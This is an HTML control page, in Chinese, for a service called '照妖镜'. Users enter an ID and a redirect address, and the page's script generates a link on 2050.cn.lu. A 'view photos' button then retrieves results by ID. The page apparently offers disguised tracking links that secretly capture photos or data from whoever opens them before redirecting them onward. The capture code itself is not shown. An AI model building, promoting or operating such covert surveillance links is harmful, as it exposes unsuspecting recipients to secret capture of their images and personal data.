
<!DOCTYPE html>
<html lang="zh-cn"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>照妖镜</title>
<link href="https://lib.baomitu.com/twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
<script src="https://lib.baomitu.com/jquery/1.12.4/jquery.min.js"></script>
<script src="https://lib.baomitu.com/layer/3.1.1/layer.js"></script>
<link rel="stylesheet" href="https://lib.baomitu.com/layer/3.1.1/theme/default/layer.css?v=3.1.1" id="layuicss-layer">
<script>
    function gg(){
    layer.alert('欢迎使用照妖镜！', {
  icon: 1,
  title: '公告',
  skin: 'layer-ext-moon'
})
}
</script>
</head>
<body background="images/1920.2021-04-20.jpg">
<div class="container">
<div class="col-xs-12 col-sm-10 col-md-8 col-lg-6 center-block" style="float: none;">
<br>
<div class="panel panel-primary">
<div class="panel-heading" style="background: linear-gradient(to right,#b221ff,#14b7ff,#8ae68a);">
<center><h3 class="panel-title">照妖镜</h3></center>
</div>
<div class="panel-body" style="text-align: center;">
<div class="list-group">
<div class="list-group-item list-group-item-warning" style="font-weight: bold;">
<span>使用教程</span>
</div>
<div class="list-group-item list-group-item-info" style="font-weight: bold;">
<input  class="form-control" type= "text" id="myid"  placeholder="请输入ID" value= ''/>
</div>
<div class="list-group-item list-group-item-info" style="font-weight: bold;">
<input  class="form-control" type= "text" id="url"  placeholder="请输入跳转地址" value= ''/></p>
</div>
<div class="list-group-item list-group-item-warning" style="font-weight: bold;">
<span><a id="kd" style="pointer-events: none;">请先生成链接！</a></span>
</div>
<div class="list-group-item">
<a onclick=window.location.href='ck.php?id='+document.getElementById('myid').value class="btn btn-block btn-primary" style="background: linear-gradient(to right,#b221ff,#14b7ff);">查看照片</a>
<br>
<a onclick= 'create();' class="btn btn-block btn-primary" style="background: linear-gradient(to right,#b221ff,#14b7ff);">生成链接</a>
<br>
<a href="/" class="btn btn-block btn-primary" style="background: linear-gradient(to right,#b221ff,#14b0ff);">按钮</a>
</div>
</div>
</div>
</div>
<div class="panel panel-default text-center">
<div class="panel-body">
©&nbsp;2021&nbsp;&nbsp;<a href="/">版权©</a>
<br>
<div id="result"></div>
</div></div></div></div>
<script>
function  create() {
    var input = document.getElementById('content');
    var kd = document.getElementById('kd');
    var myid = document.getElementById('myid');
    var url = document.getElementById('url');
    if (myid.value=="" || url.value==""){
        alert("ID或跳转地址不能为空！");
        return false;
    }
    kd.href = 'https://2050.cn.lu/?id='+myid.value+'&url='+url.value; 
    kd.style = ''; 
    kd.innerText = 'https://2050.cn.lu/?id='+myid.value+'&url='+url.value; 
}
function dialog(code, exit) {
layer.open({
type: 1,
skin: 'layui-layer-lan', //加上边框
area: ['350px', ''], //宽高
closeBtn: exit,
shade: 0.8,
title: '提示',
btnAlign: 'c',
content: code,
});
}
gg()
   </script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-RT13NSRESZ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-RT13NSRESZ');
</script>
</body></html>